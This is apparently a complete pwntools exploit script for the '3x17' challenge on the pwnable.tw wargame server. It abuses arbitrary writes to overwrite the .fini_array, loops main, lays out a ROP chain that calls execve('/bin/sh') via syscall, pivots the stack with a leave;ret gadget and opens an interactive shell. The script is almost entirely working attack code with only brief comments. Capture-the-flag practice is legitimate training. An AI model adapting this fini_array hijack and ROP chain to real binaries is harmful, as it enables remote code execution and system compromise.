from pwn import *

server = remote('chall.pwnable.tw',10105)

def send_data(addr, data):
    server.recvuntil('addr:')
    server.sendline(str(addr))
    server.recvuntil('data:')
    server.send(data)

#fini_array keeps the function address which would be executed after main
fini_array_addr = 0x00000000004b40f0
main_addr = 0x0000000000401b6d
#the loop function controlls fini_array
loop_func_addr = 0x0000000000402960
main_leave_ret_addr = 0x0000000000401c4b

send_data(fini_array_addr, p64(loop_func_addr)+p64(main_addr))

#ROPgadget --binary 3x17
pop_rax_addr = 0x000000000041e4af #pop rax ; ret
pop_rdi_addr = 0x0000000000401696 #pop rdi ; ret
pop_rsi_addr = 0x0000000000406c30 #pop rsi ; ret
pop_rdx_addr = 0x0000000000446e35 #pop rdx ; ret
syscall_addr = 0x00000000004022b4 #syscall
binsh_addr = 0x00000000004b4080
start_addr = 0x00000000004b4100

send_data(start_addr, p64(pop_rax_addr)+p64(0x3b))
send_data(start_addr+16, p64(pop_rdi_addr)+p64(binsh_addr))
send_data(binsh_addr, "/bin/sh\x00")

send_data(start_addr+32, p64(pop_rsi_addr)+p64(0))
send_data(start_addr+48, p64(pop_rdx_addr)+p64(0))
send_data(start_addr+64, p64(syscall_addr))
send_data(fini_array_addr, p64(main_leave_ret_addr))
server.interactive()